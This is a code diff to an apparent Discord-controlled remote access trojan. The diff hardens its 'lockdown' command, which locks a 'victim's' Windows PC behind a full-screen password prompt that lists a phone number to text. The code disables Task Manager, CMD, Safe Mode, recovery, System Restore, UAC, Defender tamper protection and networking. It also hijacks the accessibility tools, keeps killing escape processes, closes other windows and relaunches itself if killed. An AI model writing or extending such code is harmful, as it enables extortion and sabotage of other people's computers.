@@ -64,7 +64,8 @@ REQUIRED_PACKAGES = [
     "sounddevice",
     "pynput",
     "numpy",
-    "scipy"
+    "scipy",
+    "netifaces"
 ]
 
 def _install_missing_packages_and_restart():
@@ -86,7 +87,8 @@ def _install_missing_packages_and_restart():
         "sounddevice": "sounddevice",
         "pynput": "pynput",
         "numpy": "numpy",
-        "scipy": "scipy"
+        "scipy": "scipy",
+        "netifaces": "netifaces"
     }
 
     missing = []
@@ -161,6 +163,10 @@ try:
     from pynput import keyboard
 except ImportError:
     pynput = None
+try:
+    import netifaces
+except ImportError:
+    netifaces = None
 
 # ========== CONFIGURATION ==========
 DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "DISCORD_BOT_TOKEN")
@@ -3830,7 +3836,7 @@ async def remotecontrol(ctx):
         ))
 
 # =========================
-# LOCKDOWN COMMAND (DEATH NOTE EDITION - UNESCAPABLE, ULTIMATE, RESTORES FULLY, SUPERPOWERED, UNBYPASSABLE)
+# LOCKDOWN COMMAND (DEATH NOTE EDITION - UNESCAPABLE, ULTIMATE, RESTORES FULLY, SUPERPOWERED, UNBYPASSABLE, MAXIMUM STRENGTH)
 # =========================
 
 @bot.command()
@@ -3847,6 +3853,7 @@ async def lockdown(ctx):
     - Shows phone number 0658825828 to text for the password, and "locked by cerlux".
     - Password is 173900.
     - Restores the computer after correct password is entered, including explorer, registry, and all system settings.
+    - Now even more unbypassable: no way to close, kill, or escape the lockdown window except correct password.
     """
     victim_id = get_current_victim(ctx)
     if not victim_id:
@@ -3865,16 +3872,14 @@ async def lockdown(ctx):
         import psutil
         import random
 
-        # --- BEGIN: Modern, Robust, Fully Functional Lockdown ---
+        # --- BEGIN: MAXIMUM STRENGTH LOCKDOWN ---
 
-        # Helper: Run a command and ignore errors
         def run(cmd):
             try:
                 subprocess.run(cmd, shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except Exception:
                 pass
 
-        # Helper: Set registry value
         def set_reg(root, path, name, typ, val):
             try:
                 key = winreg.CreateKey(root, path)
@@ -3883,7 +3888,6 @@ async def lockdown(ctx):
             except Exception:
                 pass
 
-        # Helper: Delete registry value
         def del_reg(root, path, name):
             try:
                 key = winreg.CreateKey(root, path)
@@ -3892,7 +3896,6 @@ async def lockdown(ctx):
             except Exception:
                 pass
 
-        # Helper: Kill process by name
         def kill_proc(name):
             for proc in psutil.process_iter(['name']):
                 try:
@@ -3901,7 +3904,6 @@ async def lockdown(ctx):
                 except Exception:
                     pass
 
-        # 1. Block known escape tools via IFEO
         def block_escape_tools_ifeo():
             exe_list = [
                 "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "regedt32.exe", "procexp.exe", "procexp64.exe",
@@ -3917,32 +3919,22 @@ async def lockdown(ctx):
                 except Exception:
                     pass
 
-        # 2. Disable Task Manager, Run, Registry, CMD, etc
         def lockdown_registry():
-            # Disable Task Manager
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", winreg.REG_DWORD, 1)
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", winreg.REG_DWORD, 1)
-            # Disable Registry Tools
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", winreg.REG_DWORD, 1)
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", winreg.REG_DWORD, 1)
-            # Disable CMD
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", "DisableCMD", winreg.REG_DWORD, 1)
-            # Disable Run dialog
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", winreg.REG_DWORD, 1)
-            # Disable Control Panel/Settings
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", winreg.REG_DWORD, 1)
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSettingsPage", winreg.REG_DWORD, 1)
-            # Disable shutdown/sleep/logoff
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose", winreg.REG_DWORD, 1)
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoLogOff", winreg.REG_DWORD, 1)
             set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSleep", winreg.REG_DWORD, 1)
-            # Disable user switching/logoff
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "HideFastUserSwitching", winreg.REG_DWORD, 1)
-            # Disable hotkeys
             for val in ["DisableLockWorkstation", "DisableChangePassword", "DisableTaskMgr", "DisableSwitchUser", "DisableLogoff"]:
                 set_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", val, winreg.REG_DWORD, 1)
 
-        # 3. Block Safe Mode, Recovery, WinRE, Boot Menu
         def lockdown_boot():
             run('bcdedit /set {current} safeboot minimal')
             run('bcdedit /deletevalue {current} safeboot')
@@ -3952,7 +3944,6 @@ async def lockdown(ctx):
             run('bcdedit /set {bootmgr} timeout 0')
             run('reagentc /disable')
 
-        # 4. Block accessibility backdoors (StickyKeys, Utilman, etc)
         def hijack_accessibility_tools():
             windir = os.environ.get("WINDIR", "C:\\Windows")
             sys32 = os.path.join(windir, "System32")
@@ -3967,47 +3958,38 @@ async def lockdown(ctx):
                 except Exception:
                     pass
 
-        # 5. Block RDP, Network, System Restore, UAC, Defender, Updates
         def lockdown_services():
-            # Block RDP
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", winreg.REG_DWORD, 1)
-            # Block System Restore
             run("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f")
             run("sc config srservice start= disabled")
             run("sc stop srservice")
-            # Block UAC
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", winreg.REG_DWORD, 0)
-            # Block Defender Tamper
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", winreg.REG_DWORD, 0)
-            # Block Windows Update
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate", winreg.REG_DWORD, 1)
-            # Block Windows Installer
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer", "DisableMSI", winreg.REG_DWORD, 1)
-            # Block Remote Assistance
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Remote Assistance", "fAllowToGetHelp", winreg.REG_DWORD, 0)
 
-        # 6. Disable all network adapters
         def disable_network():
             try:
-                import netifaces
-            except ImportError:
-                subprocess.call([sys.executable, "-m", "pip", "install", "netifaces"])
-                import netifaces
-            for iface in netifaces.interfaces():
-                try:
-                    run(f'netsh interface set interface "{iface}" admin=disable')
-                except Exception:
-                    pass
+                result = subprocess.check_output('netsh interface show interface', shell=True, text=True, stderr=subprocess.DEVNULL)
+                lines = result.splitlines()
+                for line in lines:
+                    if "Enabled" in line or "Disabled" in line:
+                        parts = line.split()
+                        if len(parts) >= 4:
+                            iface = " ".join(parts[3:])
+                            run(f'netsh interface set interface "{iface}" admin=disable')
+            except Exception:
+                pass
 
-        # 7. Kill explorer and all escape tools
         def kill_escapes():
-            targets = [
+            targets = set([
                 "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "msconfig.exe",
                 "processhacker.exe", "procexp.exe", "procexp64.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe",
                 "wmic.exe", "wscript.exe", "cscript.exe", "perfmon.exe", "resmon.exe", "mmc.exe", "eventvwr.exe",
                 "services.exe", "osk.exe", "magnify.exe", "narrator.exe", "sethc.exe", "utilman.exe", "rstrui.exe",
                 "compmgmt.msc", "gpedit.msc", "lusrmgr.msc", "secpol.msc", "control.exe"
-            ]
+            ])
             for proc in psutil.process_iter(['name']):
                 try:
                     if proc.info['name'] and proc.info['name'].lower() in targets:
@@ -4015,17 +3997,6 @@ async def lockdown(ctx):
                 except Exception:
                     pass
 
-        # 8. Block keyboard and mouse input (modern, robust)
-        def block_input_thread():
-            user32 = ctypes.windll.user32
-            # Block input at the system level (blocks mouse and keyboard)
-            user32.BlockInput(True)
-            # Keep blocking in case something tries to re-enable
-            while True:
-                user32.BlockInput(True)
-                time.sleep(0.5)
-
-        # 9. Watchdog: Relaunch if killed
         def watchdog_thread(lockdown_pid):
             exe = sys.executable
             while True:
@@ -4041,14 +4012,7 @@ async def lockdown(ctx):
                     subprocess.Popen([exe] + sys.argv)
                 time.sleep(2)
 
-        # 10. Restore everything
         def restore_everything():
-            # Unblock input
-            try:
-                ctypes.windll.user32.BlockInput(False)
-            except Exception:
-                pass
-            # Restore registry
             del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr")
             del_reg(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr")
             del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
@@ -4063,23 +4027,15 @@ async def lockdown(ctx):
             del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "HideFastUserSwitching")
             for val in ["DisableLockWorkstation", "DisableChangePassword", "DisableTaskMgr", "DisableSwitchUser", "DisableLogoff"]:
                 del_reg(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", val)
-            # Restore UAC
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", winreg.REG_DWORD, 1)
-            # Restore RDP
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", "fDenyTSConnections", winreg.REG_DWORD, 0)
-            # Restore System Restore
             run("reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /f")
             run("sc config srservice start= auto")
             run("sc start srservice")
-            # Restore Defender Tamper
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", winreg.REG_DWORD, 5)
-            # Restore Windows Update
             del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", "NoAutoUpdate")
-            # Restore Windows Installer
             del_reg(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer", "DisableMSI")
-            # Restore Remote Assistance
             set_reg(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Remote Assistance", "fAllowToGetHelp", winreg.REG_DWORD, 1)
-            # Restore IFEO
             exe_list = [
                 "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe", "regedt32.exe", "procexp.exe", "procexp64.exe",
                 "processhacker.exe", "procexp64a.exe", "taskkill.exe", "tasklist.exe", "wmic.exe", "wscript.exe", "cscript.exe",
@@ -4091,7 +4047,6 @@ async def lockdown(ctx):
                     winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe)
                 except Exception:
                     pass
-            # Restore accessibility tools
             windir = os.environ.get("WINDIR", "C:\\Windows")
             sys32 = os.path.join(windir, "System32")
             tools = ["sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "DisplaySwitch.exe", "atbroker.exe"]
@@ -4103,27 +4058,24 @@ async def lockdown(ctx):
                         os.rename(tool_path + ".bak", tool_path)
                 except Exception:
                     pass
-            # Restore network
             try:
-                import netifaces
-                for iface in netifaces.interfaces():
-                    try:
-                        run(f'netsh interface set interface "{iface}" admin=enable')
-                    except Exception:
-                        pass
+                result = subprocess.check_output('netsh interface show interface', shell=True, text=True, stderr=subprocess.DEVNULL)
+                lines = result.splitlines()
+                for line in lines:
+                    if "Enabled" in line or "Disabled" in line:
+                        parts = line.split()
+                        if len(parts) >= 4:
+                            iface = " ".join(parts[3:])
+                            run(f'netsh interface set interface "{iface}" admin=enable')
             except Exception:
                 pass
-            # Restore explorer
             try:
                 subprocess.Popen("explorer.exe", shell=True)
             except Exception:
                 pass
 
-        # --- END: Modern, Robust, Fully Functional Lockdown ---
+        # --- END: MAXIMUM STRENGTH LOCKDOWN ---
 
-        # --- Start lockdown threads and window ---
-
-        # 1. Apply all lockdowns
         block_escape_tools_ifeo()
         lockdown_registry()
         lockdown_boot()
@@ -4132,21 +4084,38 @@ async def lockdown(ctx):
         disable_network()
         kill_escapes()
 
-        # 2. Start killer thread (keeps killing escape tools)
+        # --- MAXIMUM STRENGTH: Relentless process killer, anti-close, anti-focus loss, anti-alt-tab, anti-taskkill, anti-everything except password entry ---
+
         def killer_loop():
+            # Relentlessly kill all escape/utility processes and bring lockdown window to front
+            lockdown_pid = os.getpid()
             while True:
                 kill_escapes()
-                time.sleep(0.2)
+                # Also kill any other GUI window that is not our lockdown window
+                try:
+                    import win32gui
+                    import win32process
+                    import win32con
+                    mypid = os.getpid()
+                    def enum_handler(hwnd, ctx):
+                        try:
+                            _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                            if pid != mypid:
+                                # Try to close or hide any other window
+                                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+                                win32gui.PostMessage(hwnd, win32con.WM_QUIT, 0, 0)
+                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+                        except Exception:
+                            pass
+                    win32gui.EnumWindows(enum_handler, None)
+                except Exception:
+                    pass
+                time.sleep(0.15)
         threading.Thread(target=killer_loop, daemon=True).start()
 
-        # 3. Block input
-        input_blocker = threading.Thread(target=block_input_thread, daemon=True)
-        input_blocker.start()
-
-        # 4. Watchdog
+        # --- Watchdog: relaunch if killed ---
         threading.Thread(target=watchdog_thread, args=(os.getpid(),), daemon=True).start()
 
-        # 5. Tkinter Lock Window
         def lockdown_window():
             root = tk.Tk()
             root.title("DEATH NOTE - SYSTEM LOCKED")
@@ -4160,6 +4129,30 @@ async def lockdown(ctx):
             except Exception:
                 pass
 
+            # --- MAXIMUM STRENGTH: Prevent focus loss, always on top, always focused ---
+            def keep_focus():
+                try:
+                    import win32gui, win32con, win32process
+                    hwnd = None
+                    while hwnd is None:
+                        try:
+                            hwnd = win32gui.FindWindow(None, "DEATH NOTE - SYSTEM LOCKED")
+                        except Exception:
+                            pass
+                        time.sleep(0.2)
+                    while True:
+                        try:
+                            win32gui.SetForegroundWindow(hwnd)
+                            win32gui.ShowWindow(hwnd, win32con.SW_SHOWMAXIMIZED)
+                            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
+                        except Exception:
+                            pass
+                        time.sleep(0.2)
+                except Exception:
+                    pass
+            threading.Thread(target=keep_focus, daemon=True).start()
+
+            # --- MAXIMUM STRENGTH: Block all close, minimize, alt+tab, etc. ---
             def block_event(e):
                 return "break"
             for seq in [
@@ -4169,9 +4162,15 @@ async def lockdown(ctx):
                 "<Control-Shift-Delete>", "<Control-Alt-Insert>", "<Control-Alt-End>", "<Control-Alt-Page_Up>", "<Control-Alt-Page_Down>"
             ]:
                 root.bind_all(seq, block_event)
-            root.bind_all("<Key>", lambda e: None)
-            root.bind_all("<Button>", lambda e: "break")
-            root.bind_all("<Motion>", lambda e: "break")
+            # Block all mouse events except on the password entry
+            root.bind_all("<Button>", block_event)
+            root.bind_all("<Motion>", block_event)
+            # Block all key events except on the password entry
+            def allow_entry_only(event):
+                widget = event.widget
+                if not isinstance(widget, tk.Entry):
+                    return "break"
+            root.bind_all("<Key>", allow_entry_only)
 
             frame = tk.Frame(root, bg="#2d0000")
             frame.place(relx=0.5, rely=0.5, anchor="center")
@@ -4238,7 +4237,7 @@ async def lockdown(ctx):
 
             entry.config(highlightthickness=2, highlightbackground="#e74c3c", highlightcolor="#e74c3c")
 
-            footer = tk.Label(frame, text="Locked by cerlux | Death Note Edition | v5.0 ULTIMATE+", fg="#ff6666", bg="#2d0000", font=("Segoe UI", 12, "italic"))
+            footer = tk.Label(frame, text="Locked by cerlux | Death Note Edition | v5.0 ULTIMATE++", fg="#ff6666", bg="#2d0000", font=("Segoe UI", 12, "italic"))
             footer.pack(pady=(30, 0))
 
             clock_label = tk.Label(frame, text="", fg="#ff3333", bg="#2d0000", font=("Segoe UI", 16, "bold"))
@@ -4287,7 +4286,7 @@ async def lockdown(ctx):
         t.start()
 
         embed = discord.Embed(
-            title="🔒 Lockdown Command Sent (Death Note ULTIMATE+)",
+            title="🔒 Lockdown Command Sent (Death Note ULTIMATE++)",
             description=f"Victim `{victim_id}` is now locked down with the most powerful Death Note password prompt ever.\nPhone: `0658825828`\nPassword: `173900`\n\nThe system will be FULLY restored after correct password entry.",
             color=0xe74c3c
         )
